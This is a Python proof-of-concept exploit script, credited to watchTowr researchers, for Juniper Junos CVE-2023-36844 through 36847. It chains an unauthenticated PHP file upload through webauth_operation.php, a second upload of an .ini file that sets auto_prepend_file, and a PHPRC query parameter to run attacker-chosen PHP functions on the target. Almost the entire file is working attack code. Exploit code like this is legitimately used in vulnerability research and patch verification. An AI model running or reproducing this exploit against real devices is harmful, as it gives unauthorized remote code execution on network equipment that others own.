import requests
import re
import base64
import argparse

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchtowr-vs-junos_juniper_2023-08-25.py
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sonny, watchTowr (sonny@watchTowr.com)
        CVEs: [CVE-2023-36844, CVE-2023-36845, CVE-2023-36846, CVE-2023-36847]  """

helptext =  """
            Example Usage:
          - python watchtowr-vs-junos_juniper_2023-08-25.py --url http://localhost
          - python watchtowr-vs-junos_juniper_2023-08-25.py --url http://localhost --payload "get_current_user()"

			 """

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format https://localhost", default=False, action="store", required=True)
parser.add_argument("--payload", help="php function to call , i.e. get_current_user()", required=False, action="store")
try:
    args = parser.parse_args()
except:
    print(banner)
    print(helptext)
    raise

print(banner)

if args.payload:
    PHP_Payload = f"<?php echo('watchTowr:::'. {args.payload} .':::rwoThctaw');?>"
else:
    PHP_Payload = f"<?php echo('watchTowr:::'. php_uname() .':::rwoThctaw');?>"

requests.urllib3.disable_warnings()


print(f"[*] Target Server: {args.url} ")
print(f"[*] PHP Payload: {PHP_Payload}] ")

PHP_Payload_bytes = PHP_Payload.encode('ascii')
PHP_Payload_base64 = base64.b64encode(PHP_Payload_bytes).decode('ascii')

php_upload_req = f"{args.url}/webauth_operation.php"
php_upload_headers = {"Content-Type": "application/x-www-form-urlencoded"}
php_upload_data = {"rs": "do_upload", "rsargs[0]": "[{\"fileData\":\"data:text/html;base64,"+str(PHP_Payload_base64)+"\",\"fileName\":\"watchTowr.php\",\"csize\":"+str(len(PHP_Payload))+"}]"}
php_upload_response = requests.post(php_upload_req, headers=php_upload_headers, data=php_upload_data, verify=False)

php_file = re.findall("0\: '(.*?)'\},",php_upload_response.text)
php_path = str(php_file[0])
print(f"[*] Successfully Uploaded the .php File, found at path: /var/tmp/{php_path} ")
print(f"[*] Creating The .ini Payload ")

ini_payload = f'auto_prepend_file="/var/tmp/{php_path}"'

ini_payload_bytes = ini_payload.encode('ascii')
ini_payload_b64 = base64.b64encode(ini_payload_bytes).decode('ascii')

print(f"[*] .ini payload = '{ini_payload}' ")

Load_INI_Req = f"{args.url}/webauth_operation.php"
Load_INI_Req_Headers = {"Content-Type": "application/x-www-form-urlencoded"}
Load_INI_Req_data = {"rs": "do_upload", "rsargs[0]": "[{\"fileData\":\"data:plain/text;base64,"+ini_payload_b64+"\",\"fileName\":\"watchTowr.ini\",\"csize\":"+str(len(ini_payload))+"}]"}
ini_response = requests.post(Load_INI_Req, headers=Load_INI_Req_Headers, data=Load_INI_Req_data, verify=False)

ini_file = re.findall("0\: '(.*?)'\},",ini_response.text)
ini_file = ini_file[0]
print(f"[*] Successfully Uploaded the .ini File, found at path: /var/tmp/{ini_file} ")


exec_req = f"{args.url}/webauth_operation.php?PHPRC=/var/tmp/{ini_file}"
exec_response = requests.get(exec_req, verify=False)
exec_success = re.findall("watchTowr:::(.*?):::rwoThctaw",exec_response.text)
print(f"[*] Execution Results: " + exec_success[0])
